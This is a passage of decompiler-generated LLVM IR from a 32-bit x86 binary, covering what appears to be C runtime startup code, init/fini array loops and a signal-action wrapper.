  br label %dec_label_pc_8050d99

dec_label_pc_8050d94:                             ; preds = %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050d99:                             ; preds = %dec_label_pc_8050d8d, %dec_label_pc_8050d86, %dec_label_pc_8050d7f, %dec_label_pc_8050d78, %dec_label_pc_8050d71, %dec_label_pc_8050d65, %dec_label_pc_8050d5e, %dec_label_pc_8050d57, %dec_label_pc_8050d50, %dec_label_pc_8050d49, %dec_label_pc_8050d3b, %dec_label_pc_8050d34, %dec_label_pc_8050d42, %dec_label_pc_8050d19, %dec_label_pc_8050d0f, %dec_label_pc_8050d05, %dec_label_pc_8050cfb, %dec_label_pc_8050cf1, %dec_label_pc_8050ce7, %dec_label_pc_8050cdd, %dec_label_pc_8050cd3, %dec_label_pc_8050cc9, %dec_label_pc_8050cbf, %dec_label_pc_8050cad, %dec_label_pc_8050c9b, %dec_label_pc_8050c91, %dec_label_pc_8050c87, %dec_label_pc_8050c6d, %dec_label_pc_8050d6c, %dec_label_pc_8050d94
  %v0_8050d9c = phi i32 [ 255, %dec_label_pc_8050d8d ], [ 2048, %dec_label_pc_8050d86 ], [ 99, %dec_label_pc_8050d7f ], [ 20, %dec_label_pc_8050d78 ], [ -128, %dec_label_pc_8050d71 ], [ 1024, %dec_label_pc_8050d65 ], [ 4, %dec_label_pc_8050d5e ], [ 32, %dec_label_pc_8050d57 ], [ 256, %dec_label_pc_8050d50 ], [ 2147483647, %dec_label_pc_8050d49 ], [ 16, %dec_label_pc_8050d3b ], [ 127, %dec_label_pc_8050d34 ], [ 200112, %dec_label_pc_8050d42 ], [ 9, %dec_label_pc_8050d19 ], [ 65535, %dec_label_pc_8050d0f ], [ -32768, %dec_label_pc_8050d05 ], [ -2147483648, %dec_label_pc_8050cfb ], [ 8, %dec_label_pc_8050cf1 ], [ 500, %dec_label_pc_8050ce7 ], [ 4096, %dec_label_pc_8050cdd ], [ 16384, %dec_label_pc_8050cd3 ], [ 1000, %dec_label_pc_8050cc9 ], [ 32768, %dec_label_pc_8050cbf ], [ 6, %dec_label_pc_8050cad ], [ 65536, %dec_label_pc_8050c9b ], [ 100, %dec_label_pc_8050c91 ], [ 131072, %dec_label_pc_8050c87 ], [ 1, %dec_label_pc_8050c6d ], [ -1, %dec_label_pc_8050d6c ], [ 32767, %dec_label_pc_8050d94 ]
  ret i32 %v0_8050d9c

; uselistorder directives
  uselistorder i32 65536, { 21, 22, 0, 1, 2, 4, 3, 5, 6, 9, 10, 11, 7, 12, 8, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 12, 1, 2, 3, 4 }
  uselistorder i32 -2147483648, { 1, 0 }
  uselistorder i32 65535, { 1, 0 }
  uselistorder i32 1024, { 0, 8, 10, 5, 11, 6, 12, 7, 13, 14, 4, 15, 16, 3, 17, 18, 2, 19, 1, 20, 9, 21, 22 }
  uselistorder i32 2048, { 1, 0, 4, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @function_804deb0, { 2, 1, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 127, { 0, 3, 1, 2 }
  uselistorder i32 115, { 2, 0, 1 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 84, { 1, 0 }
  uselistorder i32 64, { 1, 2, 0 }
  uselistorder i32 60, { 1, 0 }
  uselistorder i32 48, { 1, 0 }
  uselistorder i32 46, { 2, 0, 1 }
  uselistorder i32 34, { 2, 3, 0, 1 }
  uselistorder i32 31, { 3, 2, 5, 6, 7, 8, 0, 1, 4, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 30, { 4, 0, 5, 6, 7, 1, 2, 3 }
  uselistorder i32 26, { 1, 0 }
  uselistorder i32 24, { 16, 17, 19, 18, 20, 15, 12, 10, 11, 8, 9, 6, 7, 4, 5, 2, 3, 13, 0, 1, 14 }
  uselistorder i32 23, { 1, 2, 0 }
  uselistorder i32 22, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 20, { 3, 5, 7, 6, 8, 16, 9, 10, 2, 11, 12, 13, 1, 14, 0, 15, 4 }
  uselistorder i32 19, { 1, 0 }
  uselistorder i32 15, { 1, 4, 3, 0, 2 }
  uselistorder i32 13, { 1, 0 }
  uselistorder i32 11, { 1, 2, 0 }
  uselistorder i32 9, { 2, 4, 3, 0, 5, 1 }
  uselistorder i32 7, { 2, 0, 1 }
  uselistorder i32 6, { 0, 4, 2, 3, 1, 6, 5 }
  uselistorder i32 5, { 4, 1, 2, 5, 3, 6, 7, 0 }
  uselistorder label %dec_label_pc_8050d99, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8050d6c, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8050d42, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8050cbf, { 1, 0 }
  uselistorder label %dec_label_pc_8050cad, { 1, 0 }
}

define i32 @function_8050da0() local_unnamed_addr {
dec_label_pc_8050da0:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050da0 = load i32, i32* @ebx, align 4
  store i32 %v0_8050da0, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055100.88 to i32), i32 -134566144), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055100.88 to i32), i32 -134566144), i32 2), i32 0), label %dec_label_pc_8050db4, label %dec_label_pc_8050dc1

dec_label_pc_8050db4:                             ; preds = %dec_label_pc_8050da0, %dec_label_pc_8050db4
  %v1_8050dbb6 = phi i32 [ %v1_8050dbb, %dec_label_pc_8050db4 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055100.88 to i32), i32 -134566144), i32 2), i32 -1), %dec_label_pc_8050da0 ]
  store i32 ptrtoint (i32* @global_var_8050dbb.89 to i32), i32* %stack_var_-16, align 4
  %v5_8050db4 = mul i32 %v1_8050dbb6, 4
  %v6_8050db4 = add i32 %v5_8050db4, ptrtoint (i32* @global_var_8055100.88 to i32)
  %v7_8050db4 = inttoptr i32 %v6_8050db4 to i32*
  %v8_8050db4 = load i32, i32* %v7_8050db4, align 4
  call void @__pseudo_call(i32 %v8_8050db4)
  %v0_8050dbb.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050dbb = add i32 %v0_8050dbb.pre, -1
  store i32 %v1_8050dbb, i32* %ebx.global-to-local, align 4
  %v10_8050dbc = icmp eq i32 %v0_8050dbb.pre, 0
  %v1_8050dbf = icmp eq i1 %v10_8050dbc, false
  br i1 %v1_8050dbf, label %dec_label_pc_8050db4, label %dec_label_pc_8050dc1

dec_label_pc_8050dc1:                             ; preds = %dec_label_pc_8050db4, %dec_label_pc_8050da0
  %v0_8050dc1 = load i32, i32* @global_var_805b488.90, align 8
  %v1_8050dc6 = icmp eq i32 %v0_8050dc1, 0
  br i1 %v1_8050dc6, label %dec_label_pc_8050dcc, label %dec_label_pc_8050dca

dec_label_pc_8050dca:                             ; preds = %dec_label_pc_8050dc1
  %v0_8050dca = load i32, i32* %stack_var_-16, align 4
  %v1_8050dca = call i32 @unknown_0(i32 %v0_8050dca)
  br label %dec_label_pc_8050dcc

dec_label_pc_8050dcc:                             ; preds = %dec_label_pc_8050dca, %dec_label_pc_8050dc1
  %v0_8050dcc = load i32, i32* @global_var_805b48c.91, align 4
  %v1_8050dd2 = icmp eq i32 %v0_8050dcc, 0
  br i1 %v1_8050dd2, label %dec_label_pc_8050ddb, label %dec_label_pc_8050dd6

dec_label_pc_8050dd6:                             ; preds = %dec_label_pc_8050dcc
  %v2_8050dd8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050dd8, i32* %ebx.global-to-local, align 4
  %v0_8050dd9 = load i32, i32* %stack_var_-16, align 4
  %v1_8050dd9 = call i32 @unknown_0(i32 %v0_8050dd9)
  br label %dec_label_pc_8050ddb

dec_label_pc_8050ddb:                             ; preds = %dec_label_pc_8050dcc, %dec_label_pc_8050dd6
  %v2_8050ddb = load i32, i32* %stack_var_-16, align 4
  ret i32 %v2_8050ddb

; uselistorder directives
  uselistorder i32 %v1_8050dbb, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8050ddb, { 1, 0 }
  uselistorder label %dec_label_pc_8050db4, { 1, 0 }
}

define i32 @function_8050ddf(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050ddf:
  ret i32 0
}

define i32 @function_8050de2(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050de2:
  %v0_8050de2 = load i32, i32* @eax, align 4
  ret i32 %v0_8050de2
}

define i32 @function_8050de3() local_unnamed_addr {
dec_label_pc_8050de3:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v0_8050de3 = load i32, i32* @esi, align 4
  %v0_8050de4 = load i32, i32* @ebx, align 4
  %v0_8050de8 = load i32, i32* @eax, align 4
  store i32 %v0_8050de8, i32* @esi, align 4
  %v0_8050dea = load i32, i32* @edx, align 4
  store i32 %v0_8050dea, i32* @ebx, align 4
  %v4_8050def = call i32 @function_804dd34(i32 %v0_8050de8, i32 1, i32 %tmp6)
  %v8_8050df7 = icmp eq i32 %v4_8050def, -1
  %v1_8050df8 = icmp eq i1 %v8_8050df7, false
  br i1 %v1_8050df8, label %dec_label_pc_8050e13, label %dec_label_pc_8050dfa

dec_label_pc_8050dfa:                             ; preds = %dec_label_pc_8050de3
  %v0_8050dfc = load i32, i32* @ebx, align 4
  %v5_8050e02 = call i32 @function_804dfa8(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8054020.92, i32 0, i32 0), i32 %v0_8050dfc)
  %v1_8050e0a = load i32, i32* @esi, align 4
  %v12_8050e0a = icmp eq i32 %v5_8050e02, %v1_8050e0a
  br i1 %v12_8050e0a, label %dec_label_pc_8050e13, label %dec_label_pc_8050e0e

dec_label_pc_8050e0e:                             ; preds = %dec_label_pc_8050dfa
  %v0_8050e0e = call i32 @function_8050418()
  br label %dec_label_pc_8050e13

dec_label_pc_8050e13:                             ; preds = %dec_label_pc_8050dfa, %dec_label_pc_8050de3, %dec_label_pc_8050e0e
  %v2_8050e13 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8050de4, i32* @ebx, align 4
  store i32 %v0_8050de3, i32* @esi, align 4
  ret i32 %v2_8050e13

; uselistorder directives
  uselistorder i32 ()* @function_8050418, { 0, 3, 2, 1 }
  uselistorder i32 (i8*, i32)* @function_804dfa8, { 3, 0, 1, 2 }
  uselistorder i32 (i32, i32, i32)* @function_804dd34, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8050e13, { 2, 0, 1 }
}

define i32 @function_8050e17() local_unnamed_addr {
dec_label_pc_8050e17:
  %v0_8050e1a = load i8, i8* @global_var_805b490.93, align 16
  %v1_8050e1a = icmp eq i8 %v0_8050e1a, 0
  %v1_8050e21 = icmp eq i1 %v1_8050e1a, false
  br i1 %v1_8050e21, label %dec_label_pc_8050e17.dec_label_pc_8050e53_crit_edge, label %dec_label_pc_8050e23

dec_label_pc_8050e17.dec_label_pc_8050e53_crit_edge: ; preds = %dec_label_pc_8050e17
  %v0_8050e56.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8050e53

dec_label_pc_8050e23:                             ; preds = %dec_label_pc_8050e17
  store i8 1, i8* @global_var_805b490.93, align 16
  store i32 4096, i32* @global_var_805b484.94, align 4
  %v0_8050e4e = call i32 @function_804e290()
  br label %dec_label_pc_8050e53

dec_label_pc_8050e53:                             ; preds = %dec_label_pc_8050e17.dec_label_pc_8050e53_crit_edge, %dec_label_pc_8050e23
  %v0_8050e56 = phi i32 [ %v0_8050e56.pre, %dec_label_pc_8050e17.dec_label_pc_8050e53_crit_edge ], [ %v0_8050e4e, %dec_label_pc_8050e23 ]
  ret i32 %v0_8050e56

; uselistorder directives
  uselistorder i8 1, { 24, 0, 23, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 1, 22, 2 }
  uselistorder i8* @global_var_805b490.93, { 1, 0 }
  uselistorder label %dec_label_pc_8050e53, { 1, 0 }
}

define i32 @function_8050e57(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8050e57:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %tmp39 = call i32 @__decompiler_undefined_function_0()
  %tmp44 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %tmp44, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_805b47c.95, align 4
  store i32 %arg6, i32* @global_var_805b48c.91, align 4
  %v2_8050e8e = mul i32 %arg2, 4
  %v3_8050e8e = add i32 %tmp44, %v2_8050e8e
  store i32 %v3_8050e8e, i32* %edx.global-to-local, align 4
  %v1_8050e91 = add i32 %v3_8050e8e, 4
  store i32 %v1_8050e91, i32* @global_var_805b480.86, align 128
  %v3_8050e99 = load i32, i32* %arg3, align 4
  %v14_8050e99 = icmp eq i32 %v1_8050e91, %v3_8050e99
  %v1_8050e9b = icmp eq i1 %v14_8050e99, false
  %v1_8050e91.v3_8050e8e = select i1 %v1_8050e9b, i32 %v1_8050e91, i32 %v3_8050e8e
  store i32 %v1_8050e91.v3_8050e8e, i32* @global_var_805b480.86, align 128
  %v0_8050ea3 = load i32, i32* @ecx, align 4
  store i32 %v0_8050ea3, i32* %stack_var_-160, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8050ea8 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8050ead = bitcast i32* %stack_var_-136 to i8*
  %v4_8050ead = call i32 @function_804f1d8(i8* %v3_8050ead, i32 0, i32 120)
  %v0_8050eb2 = load i32, i32* @global_var_805b480.86, align 128
  br label %dec_label_pc_8050eba

dec_label_pc_8050eba:                             ; preds = %dec_label_pc_8050eba, %dec_label_pc_8050e57
  %v0_8050eba = phi i32 [ %v1_8050ebd, %dec_label_pc_8050eba ], [ %v0_8050eb2, %dec_label_pc_8050e57 ]
  %v1_8050eba = inttoptr i32 %v0_8050eba to i32*
  %v2_8050eba = load i32, i32* %v1_8050eba, align 4
  %v3_8050eba = icmp eq i32 %v2_8050eba, 0
  %v1_8050ebd = add i32 %v0_8050eba, 4
  %v1_8050ec0 = icmp eq i1 %v3_8050eba, false
  br i1 %v1_8050ec0, label %dec_label_pc_8050eba, label %dec_label_pc_8050ee1.preheader

dec_label_pc_8050ee1.preheader:                   ; preds = %dec_label_pc_8050eba
  store i32 %v1_8050ebd, i32* @ebx, align 4
  %v1_8050ee122 = inttoptr i32 %v1_8050ebd to i32*
  %v2_8050ee123 = load i32, i32* %v1_8050ee122, align 4
  %v3_8050ee124 = icmp eq i32 %v2_8050ee123, 0
  %v1_8050ee426 = icmp eq i1 %v3_8050ee124, false
  br i1 %v1_8050ee426, label %dec_label_pc_8050ec6.lr.ph, label %dec_label_pc_8050ee6

dec_label_pc_8050ec6.lr.ph:                       ; preds = %dec_label_pc_8050ee1.preheader
  %v3_8050ea6 = ptrtoint i32* %stack_var_-168 to i32
  %v3_8050ed1 = add i32 %v3_8050ea6, 32
  br label %dec_label_pc_8050ec6

dec_label_pc_8050ec6:                             ; preds = %dec_label_pc_8050ec6.lr.ph, %dec_label_pc_8050ede
  %v1_8050ed1 = phi i32 [ %v2_8050ee123, %dec_label_pc_8050ec6.lr.ph ], [ %v2_8050ee1, %dec_label_pc_8050ede ]
  %v0_8050ed0 = phi i32 [ %v1_8050ebd, %dec_label_pc_8050ec6.lr.ph ], [ %v1_8050ede, %dec_label_pc_8050ede ]
  %v6_8050ecb = icmp ugt i32 %v1_8050ed1, 14
  br i1 %v6_8050ecb, label %dec_label_pc_8050ede, label %dec_label_pc_8050ecd

dec_label_pc_8050ecd:                             ; preds = %dec_label_pc_8050ec6
  %v0_8050ecd = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8050ecd, i32* %stack_var_-160, align 4
  store i32 %v0_8050ed0, i32* %stack_var_-168, align 4
  %v2_8050ed1 = mul i32 %v1_8050ed1, 8
  %v4_8050ed1 = add i32 %v3_8050ed1, %v2_8050ed1
  %v3_8050ed6 = inttoptr i32 %v4_8050ed1 to i16*
  %v4_8050ed6 = call i32 @function_804f1b0(i16* %v3_8050ed6, i32 %v0_8050ed0, i32 8)
  %v0_8050ede.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050ede

dec_label_pc_8050ede:                             ; preds = %dec_label_pc_8050ec6, %dec_label_pc_8050ecd
  %v0_8050ede = phi i32 [ %v0_8050ed0, %dec_label_pc_8050ec6 ], [ %v0_8050ede.pre, %dec_label_pc_8050ecd ]
  %v1_8050ede = add i32 %v0_8050ede, 8
  store i32 %v1_8050ede, i32* @ebx, align 4
  %v1_8050ee1 = inttoptr i32 %v1_8050ede to i32*
  %v2_8050ee1 = load i32, i32* %v1_8050ee1, align 4
  %v3_8050ee1 = icmp eq i32 %v2_8050ee1, 0
  %v1_8050ee4 = icmp eq i1 %v3_8050ee1, false
  br i1 %v1_8050ee4, label %dec_label_pc_8050ec6, label %dec_label_pc_8050ee6

dec_label_pc_8050ee6:                             ; preds = %dec_label_pc_8050ede, %dec_label_pc_8050ee1.preheader
  store i32 %v2_8050ea8, i32* @eax, align 4
  %v0_8050eea = call i32 @function_8052004()
  store i32 %v0_8050eea, i32* @eax, align 4
  %v0_8050eef = call i32 @function_8050e17()
  %v1_8050ef8 = icmp eq i32 %tmp39, 0
  %v1_8050efa = icmp eq i1 %v1_8050ef8, false
  %v1_8050efc = and i32 %tmp39, -65536
  %v2_8050efc = or i32 %v1_8050efc, 4096
  %storemerge = select i1 %v1_8050efa, i32 %tmp39, i32 %v2_8050efc
  store i32 %storemerge, i32* @global_var_805b484.94, align 4
  %v13_8050f05 = icmp eq i32 %tmp38, -1
  %v1_8050f0a = icmp eq i1 %v13_8050f05, false
  br i1 %v1_8050f0a, label %dec_label_pc_8050f35, label %dec_label_pc_8050f0c

dec_label_pc_8050f0c:                             ; preds = %dec_label_pc_8050ee6
  %v0_8050f0c = call i32 @function_8051294()
  store i32 %v0_8050f0c, i32* @ebx, align 4
  %v0_8050f13 = call i32 @function_8051230()
  %v0_8050f18 = load i32, i32* @ebx, align 4
  %v12_8050f18 = icmp eq i32 %v0_8050f18, %v0_8050f13
  %v1_8050f1a = icmp eq i1 %v12_8050f18, false
  br i1 %v1_8050f1a, label %dec_label_pc_8050f4b, label %dec_label_pc_8050f1c

dec_label_pc_8050f1c:                             ; preds = %dec_label_pc_8050f0c
  %v0_8050f1c = call i32 @function_8051258()
  store i32 %v0_8050f1c, i32* @ebx, align 4
  %v0_8050f23 = call i32 @function_8051208()
  %v0_8050f28 = load i32, i32* @ebx, align 4
  %v12_8050f28 = icmp eq i32 %v0_8050f28, %v0_8050f23
  %v1_8050f2a = icmp eq i1 %v12_8050f28, false
  br i1 %v1_8050f2a, label %dec_label_pc_8050f4b, label %dec_label_pc_8050f75

dec_label_pc_8050f35:                             ; preds = %dec_label_pc_8050ee6
  br label %dec_label_pc_8050f4b

dec_label_pc_8050f4b:                             ; preds = %dec_label_pc_8050f35, %dec_label_pc_8050f1c, %dec_label_pc_8050f0c
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8050f52 = call i32 @function_8050de3()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8050f61 = call i32 @function_8050de3()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8050f70 = call i32 @function_8050de3()
  br label %dec_label_pc_8050f75

dec_label_pc_8050f75:                             ; preds = %dec_label_pc_8050f1c, %dec_label_pc_8050f4b
  store i32 ptrtoint (i32* @global_var_8055100.88 to i32), i32* %esi.global-to-local, align 4
  %v0_8050f7a = load i32, i32* @edi, align 4
  %v1_8050f7a = inttoptr i32 %v0_8050f7a to i32*
  %v2_8050f7a = load i32, i32* %v1_8050f7a, align 4
  store i32 %v2_8050f7a, i32* bitcast (i32** @global_var_80553f8.97 to i32*), align 8
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055100.88 to i32), i32 -134566144), i32 2), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_805b488.90, align 8
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055100.88 to i32), i32 -134566144), i32 2), i32 0), label %dec_label_pc_8050f9a, label %dec_label_pc_8050fa6

dec_label_pc_8050f9a:                             ; preds = %dec_label_pc_8050f75, %dec_label_pc_8050f9a
  %v4_8050f9a = phi i32 [ %v1_8050fa1, %dec_label_pc_8050f9a ], [ 0, %dec_label_pc_8050f75 ]
  store i32 ptrtoint (i32* @global_var_8050fa1.98 to i32), i32* %stack_var_-160, align 4
  %v5_8050f9a = mul i32 %v4_8050f9a, 4
  %v6_8050f9a = add i32 %v5_8050f9a, ptrtoint (i32* @global_var_8055100.88 to i32)
  %v7_8050f9a = inttoptr i32 %v6_8050f9a to i32*
  %v8_8050f9a = load i32, i32* %v7_8050f9a, align 4
  call void @__pseudo_call(i32 %v8_8050f9a)
  %v0_8050fa1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050fa1 = add i32 %v0_8050fa1, 1
  store i32 %v1_8050fa1, i32* %ebx.global-to-local, align 4
  %v1_8050fa2 = load i32, i32* %esi.global-to-local, align 4
  %v7_8050fa2 = icmp ult i32 %v1_8050fa1, %v1_8050fa2
  br i1 %v7_8050fa2, label %dec_label_pc_8050f9a, label %dec_label_pc_8050fa6

dec_label_pc_8050fa6:                             ; preds = %dec_label_pc_8050f9a, %dec_label_pc_8050f75
  store i32 134549420, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055100.88 to i32), i32 -134566144), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055100.88 to i32), i32 -134566144), i32 2), i32 0), label %dec_label_pc_8050fbe, label %dec_label_pc_8050fca

dec_label_pc_8050fbe:                             ; preds = %dec_label_pc_8050fa6, %dec_label_pc_8050fbe
  %v4_8050fbe = phi i32 [ %v1_8050fc5, %dec_label_pc_8050fbe ], [ 0, %dec_label_pc_8050fa6 ]
  store i32 ptrtoint (i32* @global_var_8050fc5.99 to i32), i32* %stack_var_-160, align 4
  %v5_8050fbe = mul i32 %v4_8050fbe, 4
  %v6_8050fbe = add i32 %v5_8050fbe, ptrtoint (i32* @global_var_8055100.88 to i32)
  %v7_8050fbe = inttoptr i32 %v6_8050fbe to i32*
  %v8_8050fbe = load i32, i32* %v7_8050fbe, align 4
  call void @__pseudo_call(i32 %v8_8050fbe)
  %v0_8050fc5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050fc5 = add i32 %v0_8050fc5, 1
  store i32 %v1_8050fc5, i32* %ebx.global-to-local, align 4
  %v1_8050fc6 = load i32, i32* %esi.global-to-local, align 4
  %v7_8050fc6 = icmp ult i32 %v1_8050fc5, %v1_8050fc6
  br i1 %v7_8050fc6, label %dec_label_pc_8050fbe, label %dec_label_pc_8050fca

dec_label_pc_8050fca:                             ; preds = %dec_label_pc_8050fbe, %dec_label_pc_8050fa6
  %v0_8050fd3 = load i32, i32* %stack_var_-160, align 4
  %v1_8050fd3 = call i32 @function_804e1ec(i32 %v0_8050fd3)
  %v1_8050fd8 = inttoptr i32 %v1_8050fd3 to i32*
  store i32 0, i32* %v1_8050fd8, align 4
  store i32 0, i32* @eax, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v0_8050ff9 = load i32, i32* @edi, align 4
  store i32 %v0_8050ff9, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_8051008 = load i32, i32* @eax, align 4
  %v1_805100b = call i32 @function_80509f8(i32 %v0_8051008)
  %v0_8051015 = load i32, i32* @ebx, align 4
  %v1_8051015 = inttoptr i32 %v0_8051015 to %sigcontext*
  %v2_8051015 = call i32 @sigreturn(%sigcontext* %v1_8051015)
  %v0_805101d = load i32, i32* @ebx, align 4
  %v1_805101d = inttoptr i32 %v0_805101d to %sigcontext*
  %v2_805101d = call i32 @sigreturn(%sigcontext* %v1_805101d)
  ret i32 %v2_805101d

; uselistorder directives
  uselistorder i32 %v1_8050fc5, { 1, 2, 0 }
  uselistorder i32 %v1_8050fa1, { 1, 2, 0 }
  uselistorder i32 %v2_8050ee1, { 1, 0 }
  uselistorder i32 %v1_8050ede, { 2, 1, 0 }
  uselistorder i32 %v1_8050ebd, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8050eba, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055100.88 to i32), i32 -134566144), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055100.88 to i32), i32 -134566144), i32 2), { 1, 3, 4, 2, 0 }
  uselistorder i32 ()* @function_8050de3, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 -65536, { 1, 0 }
  uselistorder i32 32, { 37, 18, 28, 1, 0, 2, 3, 27, 4, 29, 5, 6, 7, 8, 35, 36, 34, 10, 9, 22, 21, 19, 23, 11, 12, 14, 13, 24, 26, 16, 15, 25, 30, 31, 32, 33, 17, 20 }
  uselistorder i32 (i8*, i32, i32)* @function_804f1d8, { 15, 13, 10, 14, 0, 1, 2, 3, 11, 4, 5, 6, 7, 8, 9, 12 }
  uselistorder label %dec_label_pc_8050fbe, { 1, 0 }
  uselistorder label %dec_label_pc_8050f9a, { 1, 0 }
  uselistorder label %dec_label_pc_8050f75, { 1, 0 }
  uselistorder label %dec_label_pc_8050ede, { 1, 0 }
  uselistorder label %dec_label_pc_8050ec6, { 1, 0 }
}

define i32 @function_805101f(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805101f:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_805101f = load i32, i32* @esi, align 4
  %v0_8051020 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8051035 = icmp eq i32* %arg2, null
  br i1 %v1_8051035, label %dec_label_pc_805101f.dec_label_pc_8051088_crit_edge, label %dec_label_pc_8051039

dec_label_pc_805101f.dec_label_pc_8051088_crit_edge: ; preds = %dec_label_pc_805101f
  br label %dec_label_pc_8051088

dec_label_pc_8051039:                             ; preds = %dec_label_pc_805101f
  %v2_8051039 = load i32, i32* %arg2, align 4
  store i32 %v2_8051039, i32* %stack_var_-148, align 4
  %v1_8051042 = add i32 %tmp11, 4
  %v3_8051054 = bitcast i32* %stack_var_-136 to i16*
  %v4_8051054 = call i32 @function_804f1b0(i16* %v3_8051054, i32 %v1_8051042, i32 128)
  br label %dec_label_pc_8051088

dec_label_pc_8051088:                             ; preds = %dec_label_pc_805101f.dec_label_pc_8051088_crit_edge, %dec_label_pc_8051039
  %v1_805108a = icmp eq i32 %arg3, 0
  %v2_805108e = ptrtoint i32* %stack_var_-288 to i32
  %.v2_805108e = select i1 %v1_805108a, i32 0, i32 %v2_805108e
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  %v0_80510a2 = select i1 %v1_8051035, %sigaction* null, %sigaction* %phitmp
  %v5_80510aa = call i32 @function_8051160(i32 %arg1, %sigaction* %v0_80510a2, i32 %.v2_805108e, i32 8)
  store i32 %v5_80510aa, i32* %ebx.global-to-local, align 4
  %v2_80510b8 = icmp slt i32 %v5_80510aa, 0
  %or.cond = or i1 %v1_805108a, %v2_80510b8
  br i1 %or.cond, label %dec_label_pc_80510ed, label %dec_label_pc_80510bc

dec_label_pc_80510bc:                             ; preds = %dec_label_pc_8051088
  %v3_80510bc = load i32, i32* %stack_var_-288, align 4
  %v2_80510c0 = inttoptr i32 %arg3 to i32*
  store i32 %v3_80510bc, i32* %v2_80510c0, align 4
  %v2_80510c8 = ptrtoint i32* %stack_var_-276 to i32
